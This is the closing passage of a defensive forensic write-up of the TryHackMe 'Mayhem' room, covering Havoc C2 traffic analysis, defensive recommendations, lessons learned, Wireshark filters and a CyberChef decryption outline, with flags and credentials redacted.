* [x] Threat intelligence lookup.
* [x] Havoc attribution.

---

## Cryptography

* [x] Recover AES Key.
* [x] Recover IV.
* [x] Remove protocol headers.
* [x] Validate plaintext.

---

## Artifacts

* [x] SID.
* [x] IPv6.
* [x] Username.
* [x] Persistence.
* [x] Sensitive file.

---

# 25. Defensive Recommendations

## Endpoint Hardening

* Enable PowerShell Script Block Logging.
* Enable AMSI logging.
* Enable Sysmon.
* Restrict PowerShell where possible.

---

## Network Security

* Monitor unusual HTTP downloads.
* Inspect executable transfers.
* Alert on internal HTTP servers.
* Detect beacon intervals.

---

## Identity Protection

* Alert on local account creation.
* Monitor privileged group additions.
* Audit authentication events.

---

## File Monitoring

Monitor access to:

* CSV files.
* Desktop business folders.
* Downloads executables.

---

## SOC Recommendations

| Priority | Recommendation             |
| -------- | -------------------------- |
| High     | PowerShell logging.        |
| High     | HTTP executable detection. |
| High     | Beacon detection.          |
| High     | User creation alerts.      |
| Medium   | Sensitive file monitoring. |
| Medium   | DNS anomaly detection.     |

---

# 26. Lessons Learned

## Technical Lessons

### Network Evidence Can Reconstruct Malware Execution

The PCAP alone exposed:

* downloader,
* payload,
* malware family,
* attacker commands.

---

### Protocol Knowledge Unlocks Encrypted Traffic

Understanding Havoc headers enabled successful AES decryption.

---

### Malware Doesn't Need Execution for Investigation

Static analysis plus packet analysis provided sufficient evidence.

---

### Timeline First, Answers Second

Building a timeline reduced investigation errors and improved evidence correlation.

---

## Blue Team Lessons

* Investigate process lineage.
* Correlate endpoint and network telemetry.
* Validate threat intelligence with evidence.
* Preserve original artifacts.

---

## DFIR Lessons

* Maintain chain of custody.
* Document packet references.
* Separate observations from conclusions.
* Record every IOC discovered.

---

# 27. Investigation Conclusion

## Incident Summary

The Mayhem investigation successfully reconstructed a complete malware intrusion using only packet capture evidence.

The investigation demonstrated:

* malicious PowerShell staging,
* HTTP payload delivery,
* Havoc Command & Control registration,
* AES-encrypted beacon traffic,
* Windows reconnaissance,
* persistence establishment,
* sensitive file discovery.

Every conclusion originated from observable evidence extracted through Wireshark, static malware analysis, protocol analysis, and cryptographic reconstruction.

---

## Investigation Outcomes

<table columnSizing="auto">
  <table-row>
    <table-cell width="260">**Outcome**</table-cell>
    <table-cell>**Status**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Compromised Host Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Malware Delivery Method Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Havoc Framework Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Encrypted Traffic Decoded</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Persistence Mechanism Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Sensitive Artifact Recovery</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Incident Timeline Reconstructed</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
</table>

---

## Why This Room Matters for DFIR

Mayhem teaches analysts how to move from:

**Network Traffic**

↓

**Malware Attribution**

↓

**Protocol Analysis**

↓

**Cryptographic Investigation**

↓

**Host Artifact Recovery**

↓

**Threat Hunting & Detection Engineering**

This mirrors a real Security Operations Center investigation workflow.

---

## Portfolio Reflection

This investigation demonstrates practical experience in:

* Digital Forensics
* Network Traffic Analysis
* Wireshark Investigation
* Malware Analysis
* Threat Intelligence
* Incident Response
* Threat Hunting
* MITRE ATT&CK Mapping
* Detection Engineering

Rather than simply solving a CTF, this repository documents **how an analyst thinks during an incident investigation**.

---

# 28. References & Appendix

## Primary References

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Resource**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>TryHackMe — Mayhem</table-cell>
    <table-cell>Investigation scenario.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Wireshark Documentation</table-cell>
    <table-cell>Packet analysis methodology.</table-cell>
  </table-row>
  <table-row>
    <table-cell>CyberChef Documentation</table-cell>
    <table-cell>AES-CTR decryption workflow.</table-cell>
  </table-row>
  <table-row>
    <table-cell>MITRE ATT&CK Framework</table-cell>
    <table-cell>Technique mapping.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Havoc C2 Research</table-cell>
    <table-cell>Protocol understanding.</table-cell>
  </table-row>
</table>

---

## Wireshark Filters Used

### HTTP Traffic

```wireshark
http
```

### Conversation Between Both Hosts

```wireshark
ip.addr == 10.0.2.38 && ip.addr == 10.0.2.37
```

### Port 1337

```wireshark
tcp.port == 1337
```

### Beacon Noise Reduction

```wireshark
tcp.port != 1337 &&
http &&
!(http.file_data == ...)
```

---

## CyberChef Workflow Summary

| Step | Action                        |
| ---- | ----------------------------- |
| 1    | Copy File Data as Hex Stream. |
| 2    | Remove Havoc protocol header. |
| 3    | AES Decrypt.                  |
| 4    | CTR Mode.                     |
| 5    | Use recovered Key and IV.     |
| 6    | Validate plaintext metadata.  |

---

## Screenshot References

| Figure    | Screenshot                |
| --------- | ------------------------- |
| Figure 01 | Room Banner               |
| Figure 02 | PCAP Overview             |
| Figure 03 | HTTP PowerShell Stream    |
| Figure 04 | HTTP Object Export        |
| Figure 05 | Strings Analysis          |
| Figure 06 | VirusTotal Analysis       |
| Figure 07 | Havoc Registration Packet |
| Figure 08 | AES Key & IV              |
| Figure 09 | CyberChef Decryption      |
| Figure 10 | Metadata Recovery         |
| Figure 11 | SID Artifact              |
| Figure 12 | IPv6 Artifact             |
| Figure 13 | Persistence Evidence      |
| Figure 14 | Sensitive File Discovery  |
| Figure 15 | Final Validation Artifact |
| Figure 16 | Beacon Filtering          |

---

## Public Disclosure Policy

This repository intentionally **does not publish**:

* Challenge flags.
* Passwords.
* User credentials.
* Windows SID values.
* IPv6 values.
* Direct answer strings.
* Persistence credentials.

All sensitive information is replaced with:

```text
[REDACTED]
```

The investigation remains fully reproducible while preserving the integrity of the TryHackMe room.

---

## Final Investigation Statement

> *Mayhem demonstrates that effective incident response is not about memorizing commands or extracting flags—it is about building a defensible chain of evidence from raw telemetry to actionable intelligence.*

This documentation represents a complete **Blue Team forensic investigation**, following professional DFIR methodology from packet capture acquisition through malware attribution, protocol reverse engineering, cryptographic traffic analysis, artifact recovery, MITRE ATT&CK mapping, detection engineering, and defensive recommendations.
